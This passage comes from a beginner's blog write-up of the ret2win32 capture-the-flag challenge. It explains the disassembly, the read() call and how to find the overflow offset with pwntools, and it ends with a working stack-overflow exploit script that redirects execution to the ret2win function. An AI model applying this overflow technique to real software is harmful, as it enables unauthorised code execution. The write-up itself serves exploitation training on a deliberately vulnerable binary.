+</span></span><span style="display:flex;"><span>   0x080485e9 &lt;+60&gt;:    push   0x8048788
+</span></span><span style="display:flex;"><span>   0x080485ee &lt;+65&gt;:    call   0x80483d0 &lt;puts<span style="">@</span>plt&gt;
+</span></span><span style="display:flex;"><span>   0x080485f3 &lt;+70&gt;:    add    esp,0x10
+</span></span><span style="display:flex;"><span>   0x080485f6 &lt;+73&gt;:    sub    esp,0xc
+</span></span><span style="display:flex;"><span>   0x080485f9 &lt;+76&gt;:    push   0x80487e8
+</span></span><span style="display:flex;"><span>   0x080485fe &lt;+81&gt;:    call   0x80483c0 &lt;printf<span style="">@</span>plt&gt;
+</span></span><span style="display:flex;"><span>   0x08048603 &lt;+86&gt;:    add    esp,0x10
+</span></span><span style="display:flex;"><span>   0x08048606 &lt;+89&gt;:    sub    esp,0x4
+</span></span><span style="display:flex;"><span>   0x08048609 &lt;+92&gt;:    push   0x38   &lt;----------------<span style="">#</span><span style="color:#2b91af">size_t</span> nbyte
+</span></span><span style="display:flex;"><span>   0x0804860b &lt;+94&gt;:    lea    eax,[ebp-0x28]
+</span></span><span style="display:flex;"><span>   0x0804860e &lt;+97&gt;:    push   eax    &lt;----------------<span style="">#</span><span style="color:#2b91af">void</span> buf
+</span></span><span style="display:flex;"><span>   0x0804860f &lt;+98&gt;:    push   0x0    &lt;----------------<span style="">#</span>fd
+</span></span><span style="display:flex;"><span>   0x08048611 &lt;+100&gt;:   call   0x80483b0 &lt;read<span style="">@</span>plt&gt;
+</span></span><span style="display:flex;"><span>   0x08048616 &lt;+105&gt;:   add    esp,0x10
+</span></span><span style="display:flex;"><span>   0x08048619 &lt;+108&gt;:   sub    esp,0xc
+</span></span><span style="display:flex;"><span>   0x0804861c &lt;+111&gt;:   push   0x80487eb
+</span></span><span style="display:flex;"><span>   0x08048621 &lt;+116&gt;:   call   0x80483d0 &lt;puts<span style="">@</span>plt&gt;
+</span></span><span style="display:flex;"><span>   0x08048626 &lt;+121&gt;:   add    esp,0x10
+</span></span><span style="display:flex;"><span>   0x08048629 &lt;+124&gt;:   nop
+</span></span><span style="display:flex;"><span>   0x0804862a &lt;+125&gt;:   leave  
+</span></span><span style="display:flex;"><span>   0x0804862b &lt;+126&gt;:   ret  
+</span></span></code></pre></div><p>Alot of stuff happens here, and it&rsquo;ll be somewhat hard for any beginner to know exactly what&rsquo;s happening here. But we can see that at &lt;+100&gt;, read@plt is called. If we look at the linux manpage for this systemcall we&rsquo;ll learn that: &ldquo;read() attempts to read up to count bytes from file descriptor fd into the buffer starting at buf.&rdquo; Well.. What does that mean? First we need to understand that syscalls takes arguments.</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#2b91af">ssize_t</span> read(<span style="color:#2b91af">int</span> fd, <span style="color:#2b91af">void</span> *buf, <span style="color:#2b91af">size_t</span> count);
+</span></span></code></pre></div><p>It takes a filedescriptor, a buf, annd a size_t.</p>
+<p>What&rsquo;s a file descriptor? Well according to @Beano on stackoverflow it can be classified as:
+&ldquo;An opaque handle that is used in the interface between user and kernel space to identify file/socket resources. Therefore, when you use open() or socket() (system calls to interface to the kernel), you are given a file descriptor, which is an integer (it is actually an index into the processes u structure - but that is not important). Therefore, if you want to interface directly with the kernel, using system calls to read(), write(), close() etc. the handle you use is a file descriptor.&rdquo;</p>
+<p>TLDR; It&rsquo;s a handle used between user and the kernel.</p>
+<p>Important file descriptor values are:</p>
+<pre tabindex="0"><code>Value---Name---Filestream    
+
+0---Standard input---stdin
+
+1---Standard output---stdout
+
+2---Standard error---stderr
+</code></pre><p>If you look above at the disassembling of pwnme, you can see that right before the read@plt call, 0x0 is pushed onto the stack. Which is standard input. This is when the user is prompted for input. Interesting, right?</p>
+<p>Let&rsquo;s pick up the pace a little bit. Otherwise I&rsquo;m going to be here all night.</p>
+<p>If we run the program and put in a shit ton of A&rsquo;s, we&rsquo;ll get the bread and butter of stack overflows. Segmentation fault! This tells the exploiter, that somehow he might&rsquo;ve overwritten an address in the program, causing an error.</p>
+<pre tabindex="0"><code>Segmentation fault (core dumped)
+</code></pre><p>In gdb(pwndbg) you can run a program and make it stop at certain addresses. This is done by break *addr. You can then step one instruction at a time with si or use ni, which just checks the function you&rsquo;re in. More on that later. Lets open the program with gdb and set a breakpoint right before the read(), this is in my program at pwn+98, it might be different for you. We then run and use ni twice. Now we&rsquo;re prompted for an input. Let&rsquo;s just put in a shit ton of A&rsquo;s.</p>
+<p>(A shit ton is more than 100, just like hold it A down while you glance out the windows, idfk)
+I get a &ldquo;Undefined command&rdquo;.. hmm weird.. But if I look at the registers and stack I see this:</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>Stack
+</span></span><span style="display:flex;"><span>00:0000<span style="">│</span> esp  0xffffd100 <span style="">◂—</span> 0x0
+</span></span><span style="display:flex;"><span>01:0004<span style="">│</span>      0xffffd104 <span style="">—▸</span> 0xffffd110 <span style="">◂—</span> <span style="">&#39;</span>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<span style="">&#39;</span>
+</span></span><span style="display:flex;"><span>02:0008<span style="">│</span>      0xffffd108 <span style="">◂—</span> 0x38 <span style="color:#008000">/* &#39;8&#39; */</span>
+</span></span><span style="display:flex;"><span>03:000c<span style="">│</span>      0xffffd10c <span style="">◂—</span> 0x4
+</span></span><span style="display:flex;"><span>04:0010<span style="">│</span> ecx  0xffffd110 <span style="">◂—</span> <span style="">&#39;</span>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<span style="">&#39;</span>
+</span></span></code></pre></div><p>And registers:</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>*EAX  0x38
+</span></span><span style="display:flex;"><span> EBX  0x0
+</span></span><span style="display:flex;"><span>*ECX  0xffffd110 <span style="">◂—</span> <span style="">&#39;</span>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<span style="">&#39;</span>
+</span></span><span style="display:flex;"><span>*EDX  0x38
+</span></span><span style="display:flex;"><span> EDI  0xf7fb2000 (_GLOBAL_OFFSET_TABLE_) <span style="">◂—</span> 0x1ead6c
+</span></span><span style="display:flex;"><span> ESI  0xf7fb2000 (_GLOBAL_OFFSET_TABLE_) <span style="">◂—</span> 0x1ead6c
+</span></span><span style="display:flex;"><span> EBP  0xffffd138 <span style="">◂—</span> <span style="">&#39;</span>AAAAAAAAAAAAAAAA<span style="">&#39;</span>
+</span></span><span style="display:flex;"><span> ESP  0xffffd100 <span style="">◂—</span> 0x0
+</span></span><span style="display:flex;"><span>*EIP  0x8048616 (pwnme+105) <span style="">◂—</span> add    esp, 0x10
+</span></span></code></pre></div><p>We have control of the ecx register and ebp register as we can see we overflowed those with A&rsquo;s.
+In gdb we can use the command to look at the stack:</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-diff" data-lang="diff"><span style="display:flex;"><span>-pwndbg&gt; x/100x $sp
+</span></span><span style="display:flex;"><span>0xffffd100: 0x00000000  0xffffd110  0x00000038  0x00000004
+</span></span><span style="display:flex;"><span>0xffffd110: 0x41414141  0x41414141  0x41414141  0x41414141
+</span></span><span style="display:flex;"><span>0xffffd120: 0x41414141  0x41414141  0x41414141  0x41414141
+</span></span><span style="display:flex;"><span>0xffffd130: 0x41414141  0x41414141  0x41414141  0x41414141
+</span></span><span style="display:flex;"><span>0xffffd140: 0x41414141  0x41414141  0x00000000  0xf7de5ee5
+</span></span><span style="display:flex;"><span>0xffffd150: 0xf7fb2000  0xf7fb2000  0x00000000  0xf7de5ee5
+</span></span><span style="display:flex;"><span>0xffffd160: 0x00000001  0xffffd1f4  0xffffd1fc  0xffffd184
+</span></span><span style="display:flex;"><span>0xffffd170: 0xf7fb2000  0x00000000
+</span></span></code></pre></div><p>The hex character for capital a (A) is 41. We can see the stack is filled with A&rsquo;s</p>
+<p>If we run again, we&rsquo;ll get an interesting error: &ldquo;Invalid address at 0x41414141&rdquo; error. Huh?? Seems like it tries to go to an address called 0x41414141??
+Cool if we just controlled the address the program tries to go to, we can make it go to &ldquo;ret2win&rdquo; and we would&rsquo;ve pwned the program. Now we&rsquo;ll be using a pattern generator from pwntools, to find out where this return address is at.</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>Python 3.8.5 (default, Jul 28 2020, 12:59:40) 
+</span></span><span style="display:flex;"><span>[GCC 9.3.0] on linux
+</span></span><span style="display:flex;"><span>Type <span style="color:#a31515">&#34;help&#34;</span>, <span style="color:#a31515">&#34;copyright&#34;</span>, <span style="color:#a31515">&#34;credits&#34;</span> <span style="color:#00f">or</span> <span style="color:#a31515">&#34;license&#34;</span> <span style="color:#00f">for</span> more information.
+</span></span><span style="display:flex;"><span>&gt;&gt;&gt; <span style="color:#00f">from</span> pwn <span style="color:#00f">import</span> *
+</span></span><span style="display:flex;"><span>&gt;&gt;&gt;
+</span></span><span style="display:flex;"><span>&gt;&gt;&gt; pattern = cyclic_gen()
+</span></span><span style="display:flex;"><span>&gt;&gt;&gt; pattern.get(100)
+</span></span><span style="display:flex;"><span><span style="color:#a31515">b</span><span style="color:#a31515">&#39;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa&#39;</span>
+</span></span></code></pre></div><p>If we copy the pattern, we&rsquo;ll be able to see where exactly the return addr is at.
+We follow the same process from before, and ni each step through starting from pwn+98. At return we&rsquo;ll see:
+&lt;0x6161616c&gt;
+The 616161 is a, and the 6c is an l.</p>
+<p>Great so that means we add
+aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaa, characters and can put in our address to return to. A few things to note about the address is, that:</p>
+<ol>
+<li>The address will need to be passed in little-endian formatting</li>
+<li>The address can be any address you see in gdb, that is in the .text segment, as these addresses are static</li>
+</ol>
+<p>The smart thing about Return-Oriented-Programming, is exactly that one doesn&rsquo;t have to worry about security measures
+such as ASLR, because you return to already written code that has a static address.</p>
+<p><strong>Conclusion: You should now have a lot of knowledge important for the further challenges. We used a &ldquo;shit ton&rdquo; of useless characters to overwrite the stack till our return address, at our return address we put an adress we want to return to. We convert the address, since the program is using little endian.</strong></p>
+<p>Exploit:</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#00f">from</span> pwn <span style="color:#00f">import</span> *
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>elfPath=<span style="color:#a31515">&#34;./ret2win32&#34;</span> <span style="color:#008000">#Path to binary</span>
+</span></span><span style="display:flex;"><span>context.arch=<span style="color:#a31515">&#34;i386&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>gdbscript= <span style="color:#a31515">&#34;&#34;&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#a31515">continue
+</span></span></span><span style="display:flex;"><span><span style="color:#a31515">&#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>terminalSetting = [<span style="color:#a31515">&#39;gnome-terminal&#39;</span>, <span style="color:#a31515">&#39;-e&#39;</span>] <span style="color:#008000">#Ubuntu terminal=gnome-terminal</span>
+</span></span><span style="display:flex;"><span>context.clear(terminal=terminalSetting)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io = pwnlib.gdb.debug(elfPath, gdbscript = gdbscript)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>point=cyclic_find(<span style="color:#a31515">b</span><span style="color:#a31515">&#34;laaa&#34;</span>, endian=<span style="color:#a31515">&#34;little&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ret2win=p32(0x804862c)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#00f">def</span> main():
+</span></span><span style="display:flex;"><span>    print(io.recvuntil(<span style="color:#a31515">&#34;&gt; &#34;</span>))
+</span></span><span style="display:flex;"><span>    print(io.send(<span style="color:#a31515">b</span><span style="color:#a31515">&#34;A&#34;</span>*point+ret2win)) <span style="color:#008000">#Sends 44 A&#39;s, and then the address to the ret2win function</span>
+</span></span><span style="display:flex;"><span>    io.interactive() <span style="color:#008000">#Interactive state</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>main()
+</span></span></code></pre></div>
+        </div>
+
+        <div class="row middle-xs">
+          <div class="col-xs-12">
+            
+          </div>
+        </div>
+        
+
+        <div class="site-footer">
+  
+  
+</div>
+
+      </div>
+    </div>
+  </article>
+
+  
+
+<script>
+  
+  
+    
+    
+  
+</script>
+
+  
+
+</body>
+
+</html>
